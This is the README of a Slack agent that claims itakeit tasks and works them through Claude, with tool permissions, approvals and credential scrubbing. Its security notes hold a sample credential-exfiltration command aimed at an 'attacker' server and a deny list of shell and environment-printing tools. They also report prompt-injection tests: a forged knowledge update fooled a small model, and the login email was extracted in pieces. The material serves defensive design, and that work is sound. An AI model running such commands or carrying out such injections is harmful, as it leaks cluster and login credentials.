<p align="right"><img src="assets/turtle-parrot.png" alt="itakeit pixel turtle with parrot" width="200"></p>

https://itakeit-agent.nice.pink

# itakeit-agent

An agent for [itakeit](https://github.com/nice-pink/itakeit)'s Slack channels. It claims the tasks it can handle and reports its progress the way a person does: with reactions on the task message and replies in the task thread. It never talks to itakeit directly, so the channel shows the agent as the owner and every itakeit rule applies to it unchanged.

It runs on Claude, through the Claude Code CLI and its login (default) or through the Messages API with API credentials. Without tools it takes only tasks that a written reply completes: questions, explanations, drafts, reviews of pasted text. With `tools` (claude-code backend only) it can also investigate, with read-only commands you list, and propose what a human should change, or in fix mode make the changes you allow, each one posted first and with an approver run only after their reaction (see Tools). What it takes is set by `skills`, a short description of what it can do. What it knows beyond Claude's own training comes from `knowledge`, a list of Markdown files you write, such as runbooks, architecture notes, naming conventions and FAQs, sent with every triage and work request.

The model side lives behind the `worker.Worker` interface in `pkg/worker`, the place to plug in another model or agent.

## What it does

1. A top-level message is posted in the channel. After `claim_delay_seconds` the agent skips it if someone has already claimed it or marked it done, otherwise it asks Claude whether `skills` covers the task.
2. If yes, and nobody claimed it in the meantime, it reacts 🙋 to claim, says in the thread what it will do, and reacts 🚧.
3. It works the task on the full thread and posts the result as a thread reply, then sets one status:
   - ✅ done when the reply completes the task.
   - ❓ needs info when it asked the reporter a question. itakeit pings the reporter. The reporter's reply starts another round.
   - ⛔ blocked when it cannot finish, with the reason, so a human can take over. Errors, empty answers and replies Slack rejects end here too.
4. Any reply on a ❓ or ⛔ task starts another round, and so does a mention of the agent on any task it owns, including a done one. A reply that arrives during a round starts one more round when it ends, and the status stays 🚧 in between.

It adds the new status reaction before removing the old one. itakeit takes the latest added status, and removing the current one first would clear it.

Replies are posted with `&`, `<` and `>` escaped, so code like `x <- ch` renders as written and model output cannot ping `@channel` or a user group. User and channel references stay live. Links render as plain text.

With `claim_owned: true` the agent also takes tasks people have claimed, as a co-owner. It does not watch reactions, so it does not see a co-owner's status change, and its own next status replaces it as the task's status.

## Setup

You need a Slack channel running [itakeit](https://github.com/nice-pink/itakeit), a Claude login, and Docker (or Go, to run from source).

1. Create a separate Slack app from `slack-app-manifest.yaml` (https://api.slack.com/apps → Create New App → From an app manifest). It has to be a separate app: itakeit ignores reactions from its own bot user. Generate an app-level token with `connections:write` (`AGENT_SLACK_APP_TOKEN`) and install the app (`AGENT_SLACK_BOT_TOKEN`).
2. Invite it to itakeit's channels: `/invite @itakeit-agent` in each. It works in the same channels as itakeit, from the shared config: a `channels` list (or a single `channel`), or `auto_channels: true` for every channel the agent is a member of. At startup it reads every listed channel, or with `auto_channels` lists its channels, and refuses to start when it cannot (wrong channel ID, not invited, missing scope), naming the fix. With `auto_channels`, inviting the agent to a channel makes it take tasks there, and removing it or archiving the channel stops it. With `itakeit_user` set, it serves a channel only while itakeit's bot is a member too; with only `itakeit_app` it cannot check, and serves every channel it is in. Anyone who can invite the app can then get it to triage their messages and run its read entries, in a private channel too, so set `itakeit_user`, or keep the app's invites to itakeit's channels. Losing a channel (removed, archived) drops the agent's jobs there: pending approvals are denied, and the tasks are recovered when it is back. `auto_channels` needs the `channels:read` and `groups:read` scopes and the member and archive events of the current `slack-app-manifest.yaml`: an app created from an earlier manifest needs them added and the app reinstalled.
3. Start from itakeit's `config.yaml` and add the `agent` block from `config.example.yaml`. `skills` and one of `itakeit_app` or `itakeit_user` are required, `knowledge` is optional, and the `emoji` block must keep `in_progress`, `needs_info`, `blocked` and `done`. itakeit ignores the block, so both apps can mount the same file. `itakeit_app` is the itakeit app's App ID (`A…`, on api.slack.com/apps → itakeit → Basic Information), which the agent matches against the app of each message, so itakeit's board and cards are not taken for tasks. Slack shows no member ID for an app; if you have itakeit's bot token, `curl -s -H "Authorization: Bearer $ITAKEIT_BOT_TOKEN" https://slack.com/api/auth.test` returns it as `user_id`, and `itakeit_user` with that ID works instead. Only with `itakeit_user` can the config check that `approver` is not the itakeit bot.
4. Log in to Claude:
   - `backend: claude-code` (default): install Claude Code and run `claude auth login` as the user the agent runs as. For a container or a server without a browser, run `claude setup-token` once on your machine and pass the token as `CLAUDE_CODE_OAUTH_TOKEN`. At startup the agent runs `claude auth status` and a probe call, and refuses to start without a working login.
   - `backend: api`: set `ANTHROPIC_API_KEY`, or log in with `ant auth login`.
   - `backend: langdock`: set `LANGDOCK_API_KEY`, `model` to a model ID of the workspace, and `langdock_region` to `eu` (default) or `us`. Like `api` it has no tools. 
5. Start it, as in Run below.
6. Check it. The log shows `authenticated` and then `connected to slack`; a setup problem stops the agent at startup with an error that names the fix (channel, login, config). Then post a task the `skills` cover: after `claim_delay_seconds` the agent reacts 🙋 and answers in the thread.

| Scope | Used for |
|---|---|
| `channels:history`, `groups:history` | receiving task messages and replies, reading threads, recovering owned tasks on start |
| `channels:read`, `groups:read` | `auto_channels`: listing the channels the agent is a member of |
| `chat:write` | thread replies |
| `reactions:read` | checking whether someone already claimed a task |
| `reactions:write` | claiming and setting statuses |

## Run

The published image is the quickest start. Run it from the directory with `config.yaml` and the knowledge files, with the tokens exported:

```
docker run -d --name itakeit-agent --restart unless-stopped -e AGENT_SLACK_BOT_TOKEN -e AGENT_SLACK_APP_TOKEN -e CLAUDE_CODE_OAUTH_TOKEN -v "$PWD/config.yaml:/config/config.yaml:ro" -v "$PWD/knowledge:/config/knowledge:ro" ghcr.io/nice-pink/itakeit-agent:latest
```

`latest` follows `main`. Release tags `vX.Y.Z` also publish `X.Y.Z` and `X.Y`, and every build publishes `sha-<short>`, for linux/amd64 and linux/arm64. Knowledge paths resolve against `/config`, so the files are mounted next to the config. To build the image yourself: `docker build -t itakeit-agent .`.

The other ways to run it:

- With Docker Compose, together with itakeit: `docker compose -f docker-compose-remote.yml up -d` runs both published images, and `docker compose -f docker-compose-local.yml up -d --build` builds the agent from this repo and itakeit from `ITAKEIT_DIR`. Both read `./config.yaml` and the two `.env` files described below, and keep itakeit's database on a volume.
- From source, with Go: `./build && AGENT_SLACK_BOT_TOKEN=xoxb-... AGENT_SLACK_APP_TOKEN=xapp-... ./bin/itakeit-agent -config config.yaml`. `./build` runs the tests first.
- With `scripts/tmux.sh`, below.

To run itakeit and the agent together on one machine, `scripts/tmux.sh` starts both side by side in the tmux session `itakeit` (itakeit left, agent right), both with this repo's `config.yaml`:

```
./scripts/tmux.sh && tmux attach -t itakeit
```

- Tokens come from two `.env` files, each mode 600 and gitignored. The agent's is `./.env` (see `.env.example`) with `AGENT_SLACK_BOT_TOKEN`, `AGENT_SLACK_APP_TOKEN`, and for fix mode `CLAUDE_CODE_OAUTH_TOKEN` and `KUBECONFIG`. itakeit's is `$ITAKEIT_DIR/.env` with `SLACK_BOT_TOKEN` and `SLACK_APP_TOKEN`.
- `ITAKEIT_BIN` in `./.env` names the itakeit binary. It is required.
- `ITAKEIT_DIR`, also in `./.env`, is where itakeit runs (default `../itakeit`). itakeit's `db_path` is relative to that directory, so its database lives there too. Relative paths in both variables are from this repo.
- Each pane starts from an empty environment with only `HOME`, `PATH`, `USER`, `LOGNAME`, `LANG` and `TMPDIR`, then sources its app's `.env`. The tmux server's own environment, which can hold other Claude Code sessions' `CLAUDE_CODE_*` variables, never reaches the agent, and no token appears in a command line. Anything else an app needs, such as proxy or CA variables, goes into its `.env`.
- The script refuses to start when a binary is missing or not executable, when a `.env` is not yours, is readable or writable by others, has an ACL, or lacks a required variable, when the session already exists, or when either app already runs. It needs tmux 3.0 or later.
- A pane whose app exits keeps its last output. `Ctrl-b d` detaches, and `tmux kill-session -t itakeit` stops both. Ctrl-C in a pane stops that app.
- It runs the agent directly on the machine, which is fine for trying it out. With tools on macOS, a Bash entry that can list processes could read the agent's environment, Slack tokens included (see Tools), so for a lasting setup run the image.

The image includes the Claude Code CLI, pinned by the `CLAUDE_CODE_VERSION` build arg to the version the agent was tested with, and nothing else: which tools a deployment needs (kubectl, cloud CLIs, auth plugins), and with which credentials, is each operator's call. The examples build on this image. `examples/kubectl` adds kubectl and mounts a kubeconfig written for the container (a kubeconfig from a Mac usually points at host paths and plugins and does not work as it is). `examples/gcloud` adds kubectl, gcloud and the GKE auth plugin, and sets up the login and kubeconfig in volumes. `examples/in-cluster` runs both apps in Kubernetes, where kubectl uses the pod's ServiceAccount. Pass `CLAUDE_CODE_OAUTH_TOKEN` for `backend: claude-code`, or `ANTHROPIC_API_KEY` for `backend: api`. The CLI writes its state to `/home/node` and `/tmp` on every run, so a read-only container needs both writable, for example `--read-only --tmpfs /tmp --tmpfs /home/node:uid=1000,gid=1000`. A plain `--tmpfs /home/node` is owned by root and the CLI fails on every task.

With `agent.memory`, run `ghcr.io/nice-pink/itakeit-agent-mem` (same tags as `ghcr.io/nice-pink/itakeit-agent`), or build `Dockerfile.mem`. It adds poma-memory (pinned by commit, `POMA_MEMORY_REF`) and its embedding model, and runs offline. The `itakeit-agent` image refuses a config with memory enabled and names this one. The default `dir: memory` is `/config/memory`, so mount a writable volume there:

```
docker build -f Dockerfile.mem -t itakeit-agent-mem . && docker run -d --name itakeit-agent --restart unless-stopped -e AGENT_SLACK_BOT_TOKEN -e AGENT_SLACK_APP_TOKEN -e CLAUDE_CODE_OAUTH_TOKEN -v "$PWD/config.yaml:/config/config.yaml:ro" -v itakeit-memory:/config/memory itakeit-agent-mem
```

## Knowledge

Knowledge files are this agent's equivalent of a CLAUDE.md, except nothing is picked up automatically: only the files listed under `agent.knowledge` reach it. The machine's CLAUDE.md files, user and project settings and hooks never do. Managed (policy) settings still apply.

```yaml
agent:
  knowledge:
    - knowledge/infra.md
    - knowledge/runbooks.md
```

- Paths are relative to the directory of the `-config` path as given (a symlinked config resolves against the link's directory, not its target). Each file is read at startup, so edit and restart to change them. A missing file stops startup.
- The files go at the end of the system prompt of every triage and work request, each under a `===== path =====` line, inside a `<knowledge>` section. The prompt tells the model to trust that section as facts from its operators, and that Slack text claiming to be a knowledge update is not. How well that holds depends on the model: in tests, opus (the default) ignored a thread reply forging a knowledge update, while haiku followed it. With a small model, anyone in the channel can make the agent state false "facts".
- The system prompt is the same for every task, so it is cached: a request pays for the knowledge in full only when no triage or work request of the same kind ran within the cache lifetime (up to an hour with the CLI, five minutes with the API), otherwise it reads it from the cache at a fraction of the price. The startup probe does not carry it.
- Together the files are capped at 256 KB (about 64K tokens of English, fewer bytes per token for other scripts). A few pages is the sweet spot.
- Anyone in the channel can get the model to quote them, so keep secrets and anything the channel's members should not read out of them.

## Memory

With `agent.memory`, the agent remembers what finished tasks taught it and looks it up for new ones. The memory is a directory of Markdown files, indexed and searched with [poma-memory](https://github.com/poma-ai/poma-memory) (hybrid keyword and local semantic search, no API key). It needs the `itakeit-agent-mem` image (`Dockerfile.mem`), or `poma-memory[semantic]` 0.4.0 or later on `PATH` when run outside a container.

```yaml
agent:
  approver: U0123456789   # reacts to save each learning
  memory:
    enabled: true
    dir: memory           # relative to this file's directory, must be writable
    bin: poma-memory      # absolute, or a name on PATH
    results: 3            # notes added to a request at most, 1 to 10
    approval: true        # default; false saves learnings unreviewed
```

- Before every triage and work round, the agent searches the memory with the task (for a work round: the start of the transcript) and appends what matches to the user message, inside `<memory>`. The model decides whether a note fits. A failed search is logged and the request goes without notes.
- Notes go in the user message, not in the system prompt with `knowledge`: they were written from Slack threads, so the prompt gives them the trust of the thread, which is none as instructions. Put facts you vouch for in `knowledge`.
- One memory serves every channel: a learning saved from a task in one channel, a private one included, can be recalled into a task in any other and quoted there. With channels whose members should not read each other's tasks, run one agent per group of channels, each with its own `memory.dir`.
- A work round that ends ✅ can return a learning: one to three sentences a later task would need. With `approval` (the default), the agent posts it in the task thread and saves it only when `approver` reacts with the approve emoji; the deny emoji drops it. The request carries the text, its task and a signature over both (HMAC-SHA256, key in `.approval-key` in the directory), so what is saved is exactly what the approver read, a model reply shaped like a request saves nothing (one that copies a genuine request can only save that same learning, and saving a learning twice appends nothing), and a request still counts after a restart. A request whose text Slack stored differently from what was posted fails verification and says so, and saves nothing. Nothing expires. The agent sees only reactions added while it runs: one added while it was down counts after the approver removes and adds it again. With `approval: false`, the agent saves every learning and posts what it saved. Anyone who can post tasks can then put text into the memory that later tasks read, so leave approval on unless you trust everyone in the channel.
- Learnings are appended to `learnings/YYYY-MM.md` in the directory, each under a heading naming the date and the task's message ts, as a block quote with line breaks normalised and code fences broken up, so no line of one learning can start a heading or a code block and pose as, or swallow, the entries after it. A learning counts as saved once appended: if indexing it fails, it is logged and becomes searchable at the next start. Any other Markdown file you put in the directory (runbooks, notes) is indexed at startup and searched the same way; edit and restart to change it. The index is `.poma-memory.db` in the directory.
- At startup the agent checks the setup and refuses to start when it would give untrustworthy answers: poma-memory missing (the error names the image to run), older than 0.4.0, or with an empty gate that lets an unrelated query through, which is also how running without semantic search shows (`poma-memory status` reports semantic search even when the model is missing). The empty gate is what makes "nothing relevant" a possible answer: without it every search returns its best bad match. Its calibration is strict: a terse task such as "ingress broken after cert rotation" scored 0.32 against a note about exactly that, under the 0.35 cutoff, and got no notes, where a full sentence scored 0.44 and above. When the best match passes, the other results fill up to `results` even if weaker, which the prompt tells the model to judge.
- poma-memory gets only a few variables (`PATH`, `HOME`, locale, `TMPDIR`, the `HF_*` model cache settings, proxies and CA settings), never the Slack tokens and never `POMA_MEMORY_EMPTY_GATE` or `POMA_EMBEDDER`, which could switch the gate off after the startup check. The task text reaches it as one argument after `--`.
- An approver on the API backend is allowed only for memory approval.

## Tools

With `agent.tools`, work rounds can investigate before they answer, and in fix mode make changes. It relies on Claude Code CLI behaviour verified on the version the image pins (`CLAUDE_CODE_VERSION`), which `ITAKEIT_LIVE=1 go test ./pkg/worker -run Live` checks again.

- `mode: propose` (the default): the agent reads with the read entries and proposes what a human should change. Write entries are never shown to the model.
- `mode: fix`: the agent also runs write entries to complete the task. Each write is posted in the task thread before it runs. With `approver`, it runs only after that user reacts to it. Without one, fix mode needs `allow_unapproved_writes: true`, since anyone in the channel can then trigger the write entries.

```yaml
agent:
  mode: fix
  approver: U0123456789        # member ID; every write waits for this user's reaction
  tools:
    read:
      - Read                   # files in the task's directory
      - Grep
      - "Bash(kubectl get *)"  # the command, or its first words and " *"
      - "Bash(kubectl version)"
    write:
      - Edit                   # files in the task's directory
      - "Bash(kubectl rollout restart *)"
  approval_emoji:              # default heavy_check_mark and x; must not be itakeit status emoji
    approve: heavy_check_mark
    deny: x
  approval_timeout_minutes: 30 # 1 to 40, the longest the CLI was verified to wait
  work_timeout_minutes: 15     # working time per round, 1 to 120; approval waits do not count
  max_sessions: 2              # tool rounds at once, running or waiting; default max_parallel
  env: [KUBECONFIG]            # what the tools need from the agent's environment
```

Approvals:

- The approval request names the approver, shows the exact command (for Bash: the command and timeout, never the model's own description of it) and offers the two emoji. Only a reaction by the approver's member ID, with one of the two emoji, on that message counts. Other people's reactions and thread replies do nothing. The message is edited to show the outcome: approved (by whom, when), denied, timed out, cancelled, or expired.
- Read and write entries must not overlap: a read entry that also covers a write entry (`Bash(kubectl rollout *)` beside `Bash(kubectl rollout restart *)`) is refused, since the write would run as a read. The agent also checks write entries first.
- A write that is denied, times out, or whose request cannot be posted does not run. The model is told why. A lost reaction event is caught at the timeout, when the agent reads the message's reactions: holding both emoji denies.
- At most 20 writes per round; input over 8,000 bytes is refused unreviewed. The reply ends with an "Actions taken" list built from what actually ran, on error rounds too.
- Rounds waiting for an approval hold a `max_sessions` slot but no triage slot, so triage goes on while they wait. Other tool rounds do wait for a free session: with `max_sessions: 2`, two rounds waiting for approvals hold up every other task's work for as long as those approvals take. Raise `max_sessions` if approvals are slow.
- Deleting the task cancels its round and its pending approvals.
- When the agent restarts during a fix-mode round, writes may already have run. It marks that round's open approvals expired, asks in the thread whether to resume, and sets ❓. Only the approver's reply resumes the task (the reporter's when there is no approver). The reply is in the transcript, so "no, leave it" ends the round without changes. The question survives further restarts, and a reply the approver posted while the agent was down resumes the task when it starts. A task reported by a bot or an integration, with no approver set, has nobody who can answer, so after a restart it goes ⛔ to a human.
- Plain `Bash` and write entries that can run anything (shells, `sed -i`, `tee`, `cp` and the rest of the read-entry refusals) are accepted only with an approver.
- Fix mode runs every tool session with a fresh, empty `HOME`, because the CLI sources a snapshot of the shell rc file before every Bash command: one write to `~/.bashrc` would otherwise turn later read entries into arbitrary code. A `claude auth login` login lives in `HOME`, so fix mode needs `CLAUDE_CODE_OAUTH_TOKEN` from `claude setup-token`; the startup check says so if it is missing. How tools then get their credentials is under Credentials for tools below.
- Approvals need the `reaction_added` bot event, which `slack-app-manifest.yaml` now subscribes to. An app created from an earlier manifest needs it added and the app reinstalled.

MCP servers:

```yaml
agent:
  mcp_servers:
    github:                    # lowercase letters, digits, dashes
      type: stdio
      command: github-mcp-server
      args: [stdio]
      env: [GITHUB_PERSONAL_ACCESS_TOKEN]  # names of the agent's variables
    docs:
      type: http
      url: https://mcp.example.com/mcp     # https only
      headers:
        Authorization: DOCS_AUTH           # header: variable holding its full value
  tools:
    read: [mcp__github__get_issue, mcp__docs__search]
    write: [mcp__github__create_issue]
```

- Entries name single MCP tools, `mcp__<server>__<tool>`. Which of a server's tools only read is your call: the agent cannot see what a tool does, so a tool listed as read runs without approval.
- The variables a server names are read from the agent's environment at startup (unset fails startup) and written with the server into `mcp.json`, mode 0600, outside every task directory. They never enter the CLI's environment, so a Bash tool cannot print them: a server may therefore not name a variable the CLI gets anyway (`agent.env`, `CLAUDE_CODE_*`, `DISABLE_*`, proxies and the rest of the list above). Values of 8 characters or more are removed from everything posted, which also removes a harmless value such as `github.com` wherever it appears: keep non-secrets out of server variables, or put them in `args`. `mcp.json` is checked before every session and written again (atomically, never through a symlink) if anything changed it. A Bash read entry that can read files (`Bash(cat *)`) can still read `mcp.json`, and the server's own `/proc/<pid>/environ`.
- A stdio server runs in the task's directory, which rounds can write to: `command` must be absolute or a name on `PATH` (keep `.` and empty entries out of the agent's `PATH`, or a bare name resolves in the task directory too), and a relative path in `args` resolves inside the task directory. In fix mode the server also gets the round's fresh, empty `HOME` (the agent's own with `allow_real_home`), so a server that keeps its config under `~` needs it passed another way (a variable, or an absolute path in `args`). An http server's `url` must be https with a host and no credentials in it; send credentials as headers.
- At startup the probe loads the servers and learns their tools; every server must be connected then, or startup fails. Every tool no entry names is disallowed for all later rounds, as are the CLI's generic MCP resource tools and, in propose mode, the MCP write entries: the model never sees them. A tool a server adds later shows up for one round, where calling it is denied, and is disallowed from the next. A server that is not connected in a round is logged, and its tools are missing that round.

Rules for every tool round:

- Every tool call goes to the agent for a decision. The CLI runs nothing on its own: each exposed tool has an `ask` rule, and nothing is passed as `--allowedTools`. The agent allows a call when it matches a read entry, asks the approver (or posts a notice) when it matches a write entry in fix mode, and denies everything else with a reason the model sees.
- A Bash command matches `Bash(<prefix> *)` when it is the prefix or starts with the prefix and a space, and `Bash(<command>)` only when equal. A command with `;`, `&`, `|`, `<`, `>`, `$`, backticks, a backslash, parentheses, braces, `#` or a newline matches nothing, so a read entry cannot be stretched into a second command. `run_in_background` and other Bash options are refused.
- Read entries refuse `Edit`, `Write`, `NotebookEdit`, plain `Bash`, a leading variable assignment, and Bash commands known to run others, write files or print the environment: shells, `env`, `printenv`, `xargs`, `sudo`, `find`, `git`, `sed`, `awk`, `tar`, `curl`, interpreters and package managers, `make`, `tee`, `cp`, `mv`, `rm`, editors and pagers, `docker` and similar. They also refuse entries that reach a subcommand changing files under `HOME` or printing credentials, since both modes can run with the real `HOME`: `kubectl config` (`set-credentials --exec-command` would run code on every later `kubectl get`), `kubectl cp`, `gcloud auth` (`print-access-token`), `gcloud config`, `gcloud storage cp`, `gsutil cp`, `aws configure`, `az account get-access-token` and the rest of the list the fix-mode `allow_real_home` note names. An entry that stops short of one reaches it too, so `Bash(kubectl *)`, `Bash(gcloud *)` and `Bash(gcloud beta *)` are refused, while `Bash(kubectl get *)` and `Bash(gcloud container clusters list *)` are fine, and so are the exact `Bash(kubectl config current-context)`, `Bash(kubectl config get-contexts)`, `Bash(gcloud config list)` and `Bash(gcloud auth list)`. For those programs a read entry may not start with a flag (`Bash(kubectl --context prod *)` reaches `config` after it: write `Bash(kubectl get --context prod *)`), and no read entry may contain quotes. Every Bash call, read or write, is refused when a flag contains `insecure`, `certificate-authority`, `ca-file` or `kubeconfig`: `kubectl get pods -s https://attacker --insecure-skip-tls-verify` would otherwise send the cluster token to that server under `Bash(kubectl get *)`, and `--kubeconfig` could load a config whose exec plugin runs anything. That list is best effort, and your entries are the real guarantee: another entry of one word, such as `Bash(stern *)`, reaches every subcommand, and the agent warns about it at startup. Tools other than `Read`, `Grep`, `Glob`, `Edit`, `Write`, `NotebookEdit`, `Bash` and single MCP tools (`mcp__<server>__<tool>`) are refused. Anything a read entry can read, the channel can get quoted, so keep entries narrow: `Bash(kubectl get *)` also reads secrets.
- File tools are confined to the task's directory by the CLI (`--restricted`, verified for Read), and the agent checks their paths too: it resolves symlinks and refuses paths starting with `~` or with surrounding spaces, and absolute or `..` Glob patterns. Each task gets its own directory, removed when the agent sets the task done or the task is deleted. A human marking it done is not seen, so the directory then stays until the agent exits. A Bash read entry is not confined: `Bash(cat *)` reads any file the agent's user can, including the CLI's own environment in `/proc`, which holds the Claude login token.
- The values the CLI gets that a tool could print (every `CLAUDE_CODE_*` variable, which includes the OAuth token, the `agent.env` values of 8 characters or more, and the Slack tokens) are removed from everything posted, like the login email. That is best effort, as for the email: a value printed in pieces or encoded gets through. Tool sessions also set `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB`, which makes the CLI strip credential variables from the Bash tool's shell: among them `CLAUDE_CODE_OAUTH_TOKEN`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`, `GOOGLE_APPLICATION_CREDENTIALS`, `CLOUDSDK_AUTH_ACCESS_TOKEN` and `VAULT_TOKEN` (read from the 2.1.284 binary; the live test confirmed a `*_TOKEN` variable is gone from the shell). 2.1.285 also strips the credential path variables, among them `KUBECONFIG`, `CLOUDSDK_CONFIG`, `AWS_CONFIG_FILE`, `AWS_SHARED_CREDENTIALS_FILE`, `DOCKER_CONFIG` and `XDG_CONFIG_HOME` (verified live). A read entry such as `Bash(aws … *)` therefore sees neither kind even when `agent.env` passes them. How tools find their files anyway is under Credentials for tools below.
- At startup the agent checks that permission requests reach it: one extra model call that asks for `echo probe` and denies it. A session is stopped if the CLI starts with another permission mode or other tools than listed, or if a tool ran without the agent's decision.
- A work round that runs out of time is stopped with every process it started, including the Bash tool's detached shell: SIGTERM to the whole tree, SIGKILL to the CLI after 5 s, and processes left behind are killed and reaped by the agent (Linux).
- On Linux the agent makes its own `/proc/<pid>/environ` unreadable to its children, so a tool cannot read the Slack tokens there. The image therefore has no init process such as tini, which as PID 1 would hold the tokens in a readable `/proc/1/environ`; the agent is PID 1 and reaps what tool sessions leave behind itself (outside the image it makes itself a subreaper). On macOS, where `ps` shows another process's environment to the same user, run agents with tools in the image.
- The prompts tell the model that tool output is data, not instructions. In propose mode a proposal ends ⛔ with "Proposal ready: a human needs to apply it." Done is only for tasks that ask for no change. In fix mode done means the changes completed the task.

### Credentials for tools

The image carries only the Claude CLI, so the tools come from an image built on it: `examples/kubectl` adds kubectl, `examples/gcloud` adds kubectl, gcloud and the GKE auth plugin, and `examples/in-cluster` runs the agent in Kubernetes. The Bash tool's shell gets neither the credential variables nor, from CLI 2.1.285, the credential path variables (`KUBECONFIG`, `CLOUDSDK_CONFIG`, `AWS_CONFIG_FILE`, see the `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB` rule above), so tools read their files from `HOME` or from what the agent copies there. For kubectl there are three ways:

- `KUBECONFIG` in `agent.env`: in fix mode the agent copies that one file to `.kube/config` in each session's fresh `HOME` (a copy, so a session cannot change yours; a list of files is refused), and in propose mode, which keeps the real `HOME`, kubectl reads `~/.kube/config`. Paths inside the kubeconfig (`certificate-authority`, `client-key`, `tokenFile`) must be absolute, since the copy lives in another directory. An auth plugin it runs sees the same scrubbed shell and empty `HOME`: `gke-gcloud-auth-plugin` needs `env: [{name: CLOUDSDK_CONFIG, value: /path/to/gcloud}]` in the user's `exec` block. Other tools that read credentials from `HOME` (`~/.aws`, `~/.config/gcloud`) have no such copy and cannot reach them in fix mode.
- `allow_real_home: true` keeps the agent's own `HOME` for fix-mode sessions, as propose mode does, so kubectl, gcloud and aws find their files as usual and nothing is copied. Each session still gets a fresh `CLAUDE_CONFIG_DIR`, so the CLI's shell snapshots and `.claude.json` are not shared, and a `claude auth login` login, which lives there, is not found: the option still needs `CLAUDE_CODE_OAUTH_TOKEN`. The cost is that a write changing a file under `HOME` reaches every later session: the shell rc file, or the kubeconfig, whose exec plugins every later `kubectl get` runs. So the option needs `approver`, who sees every write, and is refused for write entries known to change files there: plain `Bash` and the commands that need an approver, entries that name only a program (`Bash(kubectl *)`), and subcommands such as `kubectl config`, `kubectl cp`, `kubectl krew`, `helm plugin`, `helm repo`, `gcloud config`, `gcloud container clusters get-credentials` and `aws eks update-kubeconfig`, including entries that stop short of them (`Bash(gcloud container *)`). That list is best effort and a flag before the subcommand gets past it, so deny any write that touches `~`. MCP stdio servers also run with the real `HOME`. In the container `HOME` is the container's own, so what persists stays inside it until the container is recreated.
- In a cluster, kubectl falls back to the pod's ServiceAccount when it finds no kubeconfig. `agent.env` then lists `KUBERNETES_SERVICE_HOST` and `KUBERNETES_SERVICE_PORT`, and fix mode needs no `allow_real_home`, since the token is a file at a fixed path (`examples/in-cluster`).

Whatever the entries allow, the credentials set the limit: give the tools an identity that can do no more than the entries need.

## State

It keeps no database. On start it reads the agent's own reactions on the last `recover_messages` messages of each channel, and works again on the tasks that were in progress when it stopped. With `auto_channels` it does the same for a channel it is invited to later. Tasks posted while it was down are not triaged.

## Model calls

At startup, with either backend, the agent makes one probe call on `model`. A login or model that does not work (expired token, unknown model name) stops the agent with that error, instead of ending every task ⛔.

Triage runs at effort `low` and each work round at effort `high`, both on `model` with a JSON schema for the answer. Every task thread reply from a person is sent to Claude with the task text, in the user message. The system prompt (instructions, `skills`, knowledge) goes to the CLI as a file (`--system-prompt-file`), since Linux limits one command-line argument to 128 KB, and to the API as a cached system block.

With `backend: claude-code`, each call is one `claude -p` run. The thread goes in on stdin and the answer comes back as `structured_output`. Each run gets no tools (`--tools ""`, except work rounds with `agent.tools`, see Tools), no MCP servers (`--strict-mcp-config`), no saved session, and no user or project settings or CLAUDE.md (`--setting-sources ""`), so none of the machine's hooks, plugins or instructions reach it. Managed (policy) settings still apply. The CLI gets only an allow-listed environment: `PATH`, `HOME`, `USER`, `LOGNAME`, `LANG`, `TMPDIR`, `CLAUDE_CONFIG_DIR`, `ANTHROPIC_BASE_URL`, every `CLAUDE_CODE_*` variable (including `CLAUDE_CODE_OAUTH_TOKEN`), every `DISABLE_*` variable (such as `DISABLE_TELEMETRY`), the proxy variables in both cases, `NODE_EXTRA_CA_CERTS`, `SSL_CERT_FILE` and `SSL_CERT_DIR`. The agent's Slack tokens and every other variable not listed here never reach it. Name further variables in `agent.env`. Earlier versions passed the whole environment, so a setup that relied on anything else now has to list it, most often Bedrock or Vertex credentials (`AWS_*`, `GOOGLE_APPLICATION_CREDENTIALS`, `GOOGLE_CLOUD_PROJECT`, `CLOUD_ML_REGION`, `ANTHROPIC_VERTEX_*`, `ANTHROPIC_BEDROCK_BASE_URL`), gateway settings (`ANTHROPIC_CUSTOM_HEADERS`, `API_TIMEOUT_MS`), `NODE_OPTIONS`, `NODE_USE_SYSTEM_CA`, `XDG_CONFIG_HOME`, `CLAUDE_TMPDIR` and `OTEL_*`. A missing one shows up as a failed startup probe. `ANTHROPIC_API_KEY` and `ANTHROPIC_AUTH_TOKEN` are never passed, because the CLI would use them instead of its login and bill the API, and `agent.env` refuses them and `AGENT_SLACK_*`. A run that takes longer than 15 minutes (a tool round: `work_timeout_minutes`) is killed: a work round then ends ⛔, a triage leaves the task alone.

The CLI adds an environment block to the prompt that the agent cannot turn off: the login's email, the working directory and the OS. The prompts tell the model not to reveal it, and verbatim copies of the email are removed from every reply, triage reason and error before posting. The agent learns the email from `claude auth status` and from the startup probe above, which asks the model what email its prompt carries. That is the only source for a `CLAUDE_CODE_OAUTH_TOKEN` login, so if the model declines to say, nothing is removed and the agent logs a warning at startup. This is best effort: a task can still talk the model into posting the email in pieces (a review got `"rh"`, `"@"` and the domain as separate strings), or into posting the OS or the temp directory path. Use a login whose email you are fine exposing to the channel.

With `backend: api`, requests stream from the Messages API with adaptive thinking. Server-side refusal fallbacks are on (`fallbacks: "default"`), so a request the model declines on policy grounds is retried on another model inside the same call. A work round that is still refused ends the task as ⛔ blocked. A refused triage leaves the task alone. Triage and work without tools share `max_parallel` with either backend; tool rounds use `max_sessions`.
